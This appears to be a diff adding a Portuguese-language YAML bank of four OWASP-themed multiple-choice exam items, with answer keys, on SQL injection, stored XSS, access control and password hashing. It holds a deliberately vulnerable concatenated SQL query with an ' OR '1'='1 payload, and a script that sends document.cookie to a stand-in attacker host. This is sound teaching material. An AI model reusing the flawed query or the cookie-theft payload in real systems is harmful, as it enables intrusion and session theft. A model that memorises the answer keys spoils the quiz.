@@ -1,0 +1,127 @@
+questions:
+  - id: q.seg.owasp.01
+    topic: seg.owasp
+    difficulty: FACIL
+    boardStyle: FGV
+    source: Questão inédita — Equipe FocaQuest (estilo FGV)
+    author: Equipe FocaQuest
+    status: PUBLISHED
+    context: |
+      ```
+      String sql = "SELECT * FROM usuario WHERE login = '" + login + "'";
+      ResultSet rs = statement.executeQuery(sql);
+      ```
+    statement: O trecho acima é vulnerável a qual ataque, e qual é a contramedida mais adequada?
+    options:
+      - label: A
+        text: Cross-Site Scripting; aplicar codificação HTML na saída.
+        rationale: XSS afeta a renderização no navegador; aqui o problema é a montagem da consulta SQL.
+      - label: B
+        text: Injeção de SQL; usar consultas parametrizadas (prepared statements).
+        rationale: Com parâmetros, a entrada é tratada como dado e nunca como parte do comando SQL.
+      - label: C
+        text: Injeção de SQL; criptografar a coluna login no banco.
+        rationale: Criptografar dados em repouso não impede que a entrada altere a estrutura da consulta.
+      - label: D
+        text: Negação de serviço; limitar o número de conexões.
+        rationale: O risco principal é a manipulação da consulta, não o esgotamento de recursos.
+      - label: E
+        text: Injeção de SQL; remover manualmente aspas simples da entrada.
+        rationale: Filtros manuais são frágeis e contornáveis (codificações, outros metacaracteres); a defesa primária é a parametrização.
+    correct: B
+    explanation: |
+      Com login = "' OR '1'='1", a consulta passa a retornar todos os usuários. Consultas
+      parametrizadas separam código de dados. Privilégio mínimo da conta de banco e validação de
+      entrada são camadas adicionais.
+
+  - id: q.seg.owasp.02
+    topic: seg.owasp
+    difficulty: MEDIA
+    boardStyle: FGV
+    source: Questão inédita — Equipe FocaQuest (estilo FGV)
+    author: Equipe FocaQuest
+    status: PUBLISHED
+    context: |
+      Um portal permite comentários públicos. Um usuário publica um comentário contendo
+      <script>fetch('https://atacante.exemplo/?c=' + document.cookie)</script>, e o script passa a
+      executar no navegador de quem visualiza a página.
+    statement: O ataque descrito e a principal defesa são, respectivamente,
+    options:
+      - label: A
+        text: XSS armazenado; codificar a saída conforme o contexto (HTML, atributo, JavaScript) ao exibir o comentário.
+        rationale: O script fica persistido e é servido a outros usuários; a codificação contextual faz o navegador tratá-lo como texto.
+      - label: B
+        text: XSS refletido; usar HTTPS em todo o portal.
+        rationale: O script foi armazenado (não refletido de um parâmetro), e o HTTPS não impede a execução de scripts injetados.
+      - label: C
+        text: CSRF; incluir um token anti-CSRF nos formulários.
+        rationale: CSRF induz o navegador a enviar requisições forjadas; aqui há execução de script injetado.
+      - label: D
+        text: Injeção de SQL; usar prepared statements.
+        rationale: O comentário não altera consultas ao banco; ele é executado no navegador.
+      - label: E
+        text: Clickjacking; enviar o cabeçalho X-Frame-Options.
+        rationale: Clickjacking explora páginas embutidas em frames; não é o caso.
+    correct: A
+    explanation: |
+      Defesas contra XSS: codificação de saída contextual (a principal), sanitização quando HTML
+      for permitido, Content Security Policy e cookies de sessão com HttpOnly, que não podem ser
+      lidos por JavaScript.
+
+  - id: q.seg.owasp.03
+    topic: seg.owasp
+    difficulty: FACIL
+    boardStyle: FGV
+    source: Questão inédita — Equipe FocaQuest (estilo FGV)
+    author: Equipe FocaQuest
+    status: PUBLISHED
+    statement: |
+      Ao alterar o endereço /api/processos/1001 para /api/processos/1002, um usuário autenticado
+      consegue ver um processo sigiloso de outra parte. Essa falha é classificada como
+    options:
+      - label: A
+        text: quebra de controle de acesso (referência direta insegura a objeto).
+        rationale: O servidor não verificou se o usuário tem permissão sobre o recurso solicitado.
+      - label: B
+        text: falha criptográfica.
+        rationale: Nenhum dado foi decifrado; o problema é a ausência de verificação de autorização.
+      - label: C
+        text: injeção de comandos.
+        rationale: O usuário não injetou comandos; apenas trocou um identificador legítimo.
+      - label: D
+        text: configuração incorreta de CORS.
+        rationale: CORS controla quais origens o navegador permite; não substitui a autorização no servidor.
+      - label: E
+        text: falha de identificação e autenticação.
+        rationale: O usuário está autenticado; a falha está na autorização (o que ele pode acessar).
+    correct: A
+    explanation: |
+      Toda requisição a um recurso deve verificar, no servidor, se o usuário autenticado tem
+      direito a ele. Identificadores imprevisíveis ajudam, mas não substituem essa checagem.
+
+  - id: q.seg.owasp.04
+    topic: seg.owasp
+    difficulty: MEDIA
+    boardStyle: FGV
+    source: Questão inédita — Equipe FocaQuest (estilo FGV)
+    author: Equipe FocaQuest
+    status: PUBLISHED
+    statement: A forma mais adequada de armazenar senhas de usuários em um sistema é
+    options:
+      - label: A
+        text: criptografia simétrica com AES, guardando a chave no mesmo servidor.
+        rationale: Senhas não precisam ser recuperadas; criptografia reversível expõe todas se a chave vazar.
+      - label: B
+        text: hash MD5 sem sal.
+        rationale: MD5 é rápido e sem sal permite ataques com tabelas pré-computadas.
+      - label: C
+        text: função de hash lenta e com sal, como bcrypt ou Argon2.
+        rationale: O sal impede tabelas pré-computadas e o custo elevado dificulta a força bruta.
+      - label: D
+        text: codificação Base64.
+        rationale: Base64 é apenas codificação, reversível por qualquer pessoa.
+      - label: E
+        text: texto puro, em tabela com acesso restrito.
+        rationale: Qualquer vazamento ou acesso indevido expõe todas as senhas.
+    correct: C
+    explanation: Funções de derivação de senha (bcrypt, scrypt, Argon2, PBKDF2) são deliberadamente lentas e usam sal único por senha.
